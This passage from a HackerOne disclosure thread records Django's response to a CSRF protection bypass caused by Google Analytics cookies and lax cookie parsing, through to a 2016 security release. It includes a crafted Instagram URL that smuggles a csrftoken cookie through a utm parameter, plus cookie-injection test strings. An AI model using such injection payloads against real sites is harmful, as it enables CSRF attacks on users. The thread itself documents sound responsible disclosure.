patch.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nFlorian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-27T13:44:31.076Z","updated_at":"2014-10-27T13:44:31.076Z","actor":{"username":"apollo13","cleared":false,"url":"/apollo13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400916,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your excellent, well researched report, and your patience waiting for the payment.","markdown_message":"\u003cp\u003eThank you for your excellent, well researched report, and your patience waiting for the payment.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-04T06:46:04.859Z","updated_at":"2015-05-04T06:46:04.859Z","actor":{"url":"/django","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Django"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"django","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400920,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-05-04T06:50:24.803Z","updated_at":"2015-05-04T06:50:24.803Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400945,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-05-04T07:43:51.243Z","updated_at":"2015-05-04T07:43:51.243Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, what about disclosure?\nAnd it can still be exploited for FireFox\nhttps://instagram.com/?utm_source=1\u0026utm_medium=2\u0026utm_campaign=3\u0026utm_term=4\u0026utm_content=5%09csrftoken%3dx","markdown_message":"\u003cp\u003eHi, what about disclosure?\u003cbr\u003e\nAnd it can still be exploited for FireFox\u003cbr\u003e\n\u003ca title=\"https://instagram.com/?utm_source=1\u0026amp;utm_medium=2\u0026amp;utm_campaign=3\u0026amp;utm_term=4\u0026amp;utm_content=5%09csrftoken%3dx\" href=\"/redirect?url=https%3A%2F%2Finstagram.com%2F%3Futm_source%3D1%26utm_medium%3D2%26utm_campaign%3D3%26utm_term%3D4%26utm_content%3D5%2509csrftoken%253dx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://instagram.com/?utm_source=1\u0026amp;utm_medium=2\u0026amp;utm_campaign=3\u0026amp;utm_term=4\u0026amp;utm_content=5%09csrftoken%3dx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-07T11:06:30.129Z","updated_at":"2015-05-07T11:06:30.129Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If Firefox is still (or differently) vulnerable then we probably shouldn't it publicly just yet (regardless of the fact that you already did so in the twitter variant of the same bug). Is there an open upstream ticket about Firefox?","markdown_message":"\u003cp\u003eIf Firefox is still (or differently) vulnerable then we probably shouldn\u0026#39;t it publicly just yet (regardless of the fact that you already did so in the twitter variant of the same bug). Is there an open upstream ticket about Firefox?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-07T12:36:44.766Z","updated_at":"2015-05-07T12:36:44.766Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":404190,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2015-05-07T12:37:13.399Z","updated_at":"2015-05-07T12:37:13.399Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":404261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't reported this to FireFox, because I think, that this is Python/Django blank symbols processing issue.\n\n```python\n\u003e\u003e\u003e import Cookie\n\u003e\u003e\u003e C = Cookie.SimpleCookie()\n\u003e\u003e\u003e C.load('__utmz=blah csrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x09csrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x0bcsrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x0ccsrftoken=x')\n\u003e\u003e\u003e C\n\u003cSimpleCookie: __utmz='blah' csrftoken='x'\u003e\n```","markdown_message":"\u003cp\u003eI haven\u0026#39;t reported this to FireFox, because I think, that this is Python/Django blank symbols processing issue.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eCookie\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eCookie\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSimpleCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;__utmz=blah csrftoken=x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;__utmz=blah\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x09\u003c/span\u003e\u003cspan class=\"s\"\u003ecsrftoken=x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;__utmz=blah\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x0b\u003c/span\u003e\u003cspan class=\"s\"\u003ecsrftoken=x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;__utmz=blah\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x0c\u003c/span\u003e\u003cspan class=\"s\"\u003ecsrftoken=x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eC\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003eSimpleCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003e__utmz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;blah\u0026#39;\u003c/span\u003e \u003cspan class=\"n\"\u003ecsrftoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2015-05-07T14:17:44.102Z","updated_at":"2015-05-07T14:17:44.102Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, it's a python issue. Is there an open bug for it? I know here were some followup problems associated with the python patch, but I'm not sure where that ended up.","markdown_message":"\u003cp\u003eYeah, it\u0026#39;s a python issue. Is there an open bug for it? I know here were some followup problems associated with the python patch, but I\u0026#39;m not sure where that ended up.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-07T17:03:16.368Z","updated_at":"2015-05-07T17:03:16.368Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":781561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey, I can't reproduce the problem with the Instagram link you provided and Firefox 44. Are you able to?","markdown_message":"\u003cp\u003eHi Sergey, I can\u0026#39;t reproduce the problem with the Instagram link you provided and Firefox 44. Are you able to?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-02T18:14:52.940Z","updated_at":"2016-02-02T18:14:52.940Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":781606,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way, what do you think the correct behavior is for parsing the whitespace case? Following the \"lax parsing\" fix in Python, we've had a number of reports where invalid cookies set by third-parties causes all subsequent cookies not to be parsed which causes the Django session to be lost (or even prevents users from being able to login).\n\nhttps://bugs.python.org/issue25228\nhttps://code.djangoproject.com/ticket/26158","markdown_message":"\u003cp\u003eBy the way, what do you think the correct behavior is for parsing the whitespace case? Following the \u0026quot;lax parsing\u0026quot; fix in Python, we\u0026#39;ve had a number of reports where invalid cookies set by third-parties causes all subsequent cookies not to be parsed which causes the Django session to be lost (or even prevents users from being able to login).\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://bugs.python.org/issue25228\" href=\"/redirect?url=https%3A%2F%2Fbugs.python.org%2Fissue25228\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.python.org/issue25228\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://code.djangoproject.com/ticket/26158\" href=\"/redirect?url=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F26158\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://code.djangoproject.com/ticket/26158\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-02T18:40:01.145Z","updated_at":"2016-02-02T18:40:01.145Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If Django's cookie parsing is still problematic here, I think it should be fixed in Django 1.10 by https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452. We could consider backporting that patch to Django 1.9 and 1.8 if necessary. I'm not sure about the steps to reproduce -- I forget what I did earlier. Is an Instagram account required?","markdown_message":"\u003cp\u003eIf Django\u0026#39;s cookie parsing is still problematic here, I think it should be fixed in Django 1.10 by \u003ca title=\"https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdjango%2Fdjango%2Fcommit%2F93a135d111c2569d88d65a3f4ad9e6d9ad291452\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We could consider backporting that patch to Django 1.9 and 1.8 if necessary. I\u0026#39;m not sure about the steps to reproduce -- I forget what I did earlier. Is an Instagram account required?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-12T18:13:05.821Z","updated_at":"2016-09-12T18:13:05.821Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, this patch looks correct. \nIt looks like instagram stopped using Google Analytics and currently is not vulnerable.","markdown_message":"\u003cp\u003eYes, this patch looks correct. \u003cbr\u003e\nIt looks like instagram stopped using Google Analytics and currently is not vulnerable.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-12T19:35:02.937Z","updated_at":"2016-09-12T19:35:02.937Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1189479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is it worth setting up a test site to confirm the issue still exists in older versions of Django (to confirm browsers  haven't changed behavior, I guess) and to confirm that Django 1.10 fixes it?","markdown_message":"\u003cp\u003eIs it worth setting up a test site to confirm the issue still exists in older versions of Django (to confirm browsers  haven\u0026#39;t changed behavior, I guess) and to confirm that Django 1.10 fixes it?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-12T20:00:33.278Z","updated_at":"2016-09-12T20:00:33.278Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I checked locally django 1.9 and django 1.10.\nDjango 1.9 (vulnerable)\n```\nCookie: test=test;csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=\";csrftoken=xxx;\nSet-Cookie:  csrftoken=0wimKaIH8G80FQIS4RTytZHTd4YG7NCF;\n\nCookie: test=test csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0bcsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0ccsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n```\n\nDjango 1.10 (not vulnerable)\n```\nCookie: test=test;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=\";csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=test csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=DFuxUi1LLWPvRo4UGDpKN04fi7fLlKPazescjWpGUTiZ7UfNbKVN5rsq0F3viliq;\n\nCookie: test=test\\x0Bcsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=vNcLbQhSzhMBvoj4qB74ttCwq9JVwUvblWUSBynOFraVq0A7s899NYZXuCyIcRe8;\n\nCookie: test=test\\x0Ccsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=X3WYa2flCaPfLmW64okiFlkcmnzzizbcaru78nLwyZnhASpwsu6x6j0ia5dwfzit;\n```","markdown_message":"\u003cp\u003eI checked locally django 1.9 and django 1.10.\u003cbr\u003e\nDjango 1.9 (vulnerable)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCookie: test=test;csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=\u0026quot;;csrftoken=xxx;\nSet-Cookie:  csrftoken=0wimKaIH8G80FQIS4RTytZHTd4YG7NCF;\n\nCookie: test=test csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0bcsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0ccsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDjango 1.10 (not vulnerable)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCookie: test=test;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=\u0026quot;;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=test csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=DFuxUi1LLWPvRo4UGDpKN04fi7fLlKPazescjWpGUTiZ7UfNbKVN5rsq0F3viliq;\n\nCookie: test=test\\x0Bcsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=vNcLbQhSzhMBvoj4qB74ttCwq9JVwUvblWUSBynOFraVq0A7s899NYZXuCyIcRe8;\n\nCookie: test=test\\x0Ccsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=X3WYa2flCaPfLmW64okiFlkcmnzzizbcaru78nLwyZnhASpwsu6x6j0ia5dwfzit;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-09-12T20:32:44.026Z","updated_at":"2016-09-12T20:32:44.026Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1189975,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, I'll start the security release process. How does this look for a release note:\n\nCSRF protection bypass on a site with Google Analytics\n======================================================\n\nAn interaction between Google Analytics and Django's cookie parsing could allow\nan attacker to set arbitrary cookies leading to a bypass of CSRF protection.\n\nThe parser for ``request.COOKIES`` is simplified to better match the behavior\nof browsers and to mitigate this attack. ``request.COOKIES`` may now contain\ncookies that are invalid according to :rfc:`6265` but are possible to set via\n``document.cookie``.","markdown_message":"\u003cp\u003eThanks, I\u0026#39;ll start the security release process. How does this look for a release note:\u003c/p\u003e\n\n\u003ch1 id=\"csrf-protection-bypass-on-a-site-with-google-analytics\"\u003eCSRF protection bypass on a site with Google Analytics\u003c/h1\u003e\n\n\u003cp\u003eAn interaction between Google Analytics and Django\u0026#39;s cookie parsing could allow\u003cbr\u003e\nan attacker to set arbitrary cookies leading to a bypass of CSRF protection.\u003c/p\u003e\n\n\u003cp\u003eThe parser for \u003ccode\u003erequest.COOKIES\u003c/code\u003e is simplified to better match the behavior\u003cbr\u003e\nof browsers and to mitigate this attack. \u003ccode\u003erequest.COOKIES\u003c/code\u003e may now contain\u003cbr\u003e\ncookies that are invalid according to :rfc:\u003ccode\u003e6265\u003c/code\u003e but are possible to set via\u003cbr\u003e\n\u003ccode\u003edocument.cookie\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-12T23:22:09.702Z","updated_at":"2016-09-12T23:22:09.702Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189979,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-12T23:23:01.413Z","updated_at":"2016-09-12T23:23:01.413Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216924,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Released today: https://www.djangoproject.com/weblog/2016/sep/26/security-releases/","markdown_message":"\u003cp\u003eReleased today: \u003ca title=\"https://www.djangoproject.com/weblog/2016/sep/26/security-releases/\" href=\"/redirect?url=https%3A%2F%2Fwww.djangoproject.com%2Fweblog%2F2016%2Fsep%2F26%2Fsecurity-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.djangoproject.com/weblog/2016/sep/26/security-releases/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-26T19:11:09.315Z","updated_at":"2016-09-26T19:11:09.315Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216925,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-26T19:11:44.497Z","updated_at":"2016-09-26T19:11:44.497Z","first_to_agree":true,"actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-26T19:29:10.907Z","updated_at":"2016-09-26T19:29:10.907Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1216977,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-26T19:29:11.012Z","updated_at":"2016-09-26T19:29:11.012Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}